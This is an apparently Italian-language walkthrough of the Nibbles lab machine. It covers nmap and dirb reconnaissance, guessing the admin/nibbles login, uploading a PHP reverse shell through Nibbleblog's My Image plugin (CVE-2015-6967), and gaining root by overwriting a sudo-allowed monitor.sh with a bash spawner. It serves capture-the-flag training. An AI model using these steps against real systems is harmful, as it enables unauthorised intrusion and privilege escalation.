# Nibbbles

## Reconnaissance

Per prima cosa eseguo una scansione iniziale con nmap per conoscere le porte aperte e i servizi che girano su di esse.

```text
sudo nmap -sC -sV -O -oA /usr/share/nmap/initial 10.10.10.75
```

* **-sC**: scipt nmap di default
* **-sV**: per rilevare la versione dei servizi
* **-O**: per rilevare il SO
* **-oA**: per stampare tutti i formati e salvarli nel file _nmap/initial_

Le porte aperte sono le seguenti:

* **Porta 22**: OpenSSH 7.2p2
* **Porta 80**: Apache 2.4.18

```text
map scan report for 10.10.10.75
Host is up (0.072s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=9/19%OT=22%CT=1%CU=30464%PV=Y%DS=2%DC=I%G=Y%TM=650977F
OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)SEQ
OS:(SP=105%GCD=1%ISR=10C%TI=Z%II=I%TS=8)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O
OS:3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=7120%W2=
OS:7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSN
OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration

In questa fase cerco di capire se qualcuno di questi servizi è configurato in modo errato o se presenta vulnerabilità note.

### 1) Porta 22 OpenSSH 7.2p2

La vulnerabilità trovata:
  * OpenSSH 2.3 < 7.7 - Username Enumeration

Questa vulnerabilità ci permette di fare username enumeration [CVE-2018-15473](https://github.com/Sait-Nuri/CVE-2018-15473).

Non mi interessa utilizzare questa vulnerabilità per il momento, quindi proseguo.

### 2) Porta 80 Apache 2.4.18

Non trovo nulla di interessante.

### 3) Directory enumeration

Ispezionando la pagina http://10.10.10.75 trovo questo:

<p align="center">
  <img src="/Immagini/Linux-Box/Nibbles/nibbles-1.png" />
</p>

Quindi vado all'indirizzo http://10.10.10.75/nibbleblog:

<p align="center">
  <img src="/Immagini/Linux-Box/Nibbles/nibbles-2.png" />
</p>

Utilizzo il comando dirb, dal quale ottengo il seguente risultato:

```text
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Sep 19 06:38:41 2023
URL_BASE: http://10.10.10.75/nibbleblog/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.75/nibbleblog/ ----
==> DIRECTORY: http://10.10.10.75/nibbleblog/admin/                                                                 
+ http://10.10.10.75/nibbleblog/admin.php (CODE:200|SIZE:1401)                                                      
==> DIRECTORY: http://10.10.10.75/nibbleblog/content/                                                               
+ http://10.10.10.75/nibbleblog/index.php (CODE:200|SIZE:2987)                                                      
==> DIRECTORY: http://10.10.10.75/nibbleblog/languages/                                                             
==> DIRECTORY: http://10.10.10.75/nibbleblog/plugins/                                                               
+ http://10.10.10.75/nibbleblog/README (CODE:200|SIZE:4628)                                                         
==> DIRECTORY: http://10.10.10.75/nibbleblog/themes/                                                                

---- Entering directory: http://10.10.10.75/nibbleblog/admin/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.10.75/nibbleblog/content/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.10.75/nibbleblog/languages/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.10.75/nibbleblog/plugins/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.10.75/nibbleblog/themes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Tue Sep 19 06:44:33 2023
DOWNLOADED: 4612 - FOUND: 3
```

Per prima cosa vad sulla pagina http://10.10.10.75/nibbleblog/README, dalla quale riesco a risalire alla versione di Nibbleblog utilizzata:

```text
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01

Site: http://www.nibbleblog.com
Blog: http://blog.nibbleblog.com
Help & Support: http://forum.nibbleblog.com
Documentation: http://docs.nibbleblog.com

===== Social =====
* Twitter: http://twitter.com/nibbleblog
* Facebook: http://www.facebook.com/nibbleblog
* Google+: http://google.com/+nibbleblog

===== System Requirements =====
* PHP v5.2 or higher
* PHP module - DOM
* PHP module - SimpleXML
* PHP module - GD
* Directory â€œcontentâ€ writable by Apache/PHP

Optionals requirements

* PHP module - Mcrypt
...
```

Da una semplice ricerca scopro che esiste una vulnerabilità che posso sfruttare: [Nibbleblog 4.0.3 - Arbitrary File Upload (CVE-2015-6967)](https://github.com/dix0nym/CVE-2015-6967)

Vado sulla pagina http://10.10.10.75/nibbleblog/admin.php e provo ad entrare con username e password banali:
  * administrator, administrator
  * admin, admin
  * administrator, nibbles
  * admin, nibbles (**BOOM!!!**)

<p align="center">
  <img src="/Immagini/Linux-Box/Nibbles/nibbles-3.png" />
</p>

Dopodichè vado nella sezione Plugin > My image e carico il file php (scaricato precedentemente) modificando l'indirizzo ip e la porta al suo interno (con quella del listener che metto in ascolto sulla mia macchina):

<p align="center">
  <img src="/Immagini/Linux-Box/Nibbles/nibbles-4.png" />
</p>

Vado all'indirizzo dove è stata appena caricata l'immagine per avviare la reverse shell.

```text
http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php
```

**Ottengo così il primo flag!**

<p align="center">
  <img src="/Immagini/Linux-Box/Nibbles/nibbles-5.png" />
</p>

## Privilege Escalation

Dall'immagine precedente si può notare che è l'utente nibbler può eseguire monitor.sh pur non possedendo la password root.

Quindi modifico il file nel seguente modo:

```text
rm monitor.sh
touch monitor.sh
echo "#!/bin/sh" >> monitor.sh
echo "bash" >> monitor.sh
chmod +x monitor.sh
```

**Eseguendolo ottengo il contenuto di root.txt**

<p align="center">
  <img src="/Immagini/Linux-Box/Nibbles/nibbles-6.png" />
</p>
